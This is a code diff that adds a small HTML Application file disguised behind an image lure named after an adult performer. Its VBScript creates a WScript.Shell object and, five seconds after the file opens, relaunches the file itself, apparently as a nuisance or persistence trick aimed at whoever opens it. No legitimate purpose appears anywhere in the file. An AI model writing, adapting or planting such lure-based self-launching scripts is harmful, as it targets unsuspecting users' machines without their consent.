@@ -1,0 +1,15 @@
+<!DOCTYPE html>
+<HEAD>
+<TITLE>Restore Me</TITLE>
+<HTA:APPLICATION ID="RestoreMe" SINGLEINSTANCE="yes">
+<SCRIPT language="VBScript">
+Sub RestoreMe
+    Set objShell = CreateObject("WScript.Shell")
+    objShell.run  location
+End Sub
+Call window.setTimeout("RestoreMe", 5000)
+</SCRIPT>
+</HEAD>
+<BODY style="background:url('Sunny_Leone.jpg')">
+</BODY>
+</HTML>
